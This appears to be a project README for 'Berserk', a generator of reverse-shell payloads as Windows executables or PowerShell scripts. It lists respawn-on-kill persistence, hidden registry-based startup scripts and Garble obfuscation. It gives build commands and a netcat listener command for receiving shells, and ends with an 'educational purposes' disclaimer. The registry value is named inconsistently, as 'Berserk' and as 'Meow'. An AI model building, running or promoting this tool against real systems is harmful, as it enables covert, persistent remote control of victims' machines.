### BERSERK 

![!\[Alt text\](<>)](<Berserk.jpg>)

## 🚀 Features

- Generates a PE binary (Windows) or a `.ps1` PowerShell script to launch a reverse shell.
- Automatic persistence: if the process is killed, a new one is spawned.
- Creates hidden startup scripts (Batch + VBS) using `reg.exe` (registry value: `Berserk`).
- `-Ps` option: generates only the `.ps1` script.
- Go binaries obfuscated using **Garble**.

---

## ⚙️ Prerequisites

- Python 3  
- Go (for Go version)
- Garble (`go install mvdan.cc/garble@latest`)  
- patchelf (Linux): `sudo apt install patchelf`

---

## 📥 Installation

```bash
git clone https://github.com/BenzoXdev/Berserk.git
cd Berserk
pip install -r requirements.txt
export PATH="$PATH:$(go env GOPATH)/bin"
```
 
---

🛠️ Usage

Generate a Windows executable (Python-based)

python3 berserk.py -o your_binary.exe

Generate an obfuscated Go binary

python3 berserk.py -go -o your_go_binary.exe

Generate PowerShell script only

python3 berserk.py -Ps -o berserk.ps1

Persistent startup

You can rename the file if desired:

./berserk.ps1 -p

> The default registry key value is Meow.



Tip: On Linux, use wine to compile a Windows binary from a Python script.


---

🎧 Listening for Connections

nc -lvnp <port>


---

📖 Wine Tutorial

See wine-tuto for more details.


---

⚠️ Disclaimer

The author takes NO responsibility for how you choose to use this tool.
Berserk is provided “AS IS”, strictly for educational and research purposes only.
Use it at your own risk.
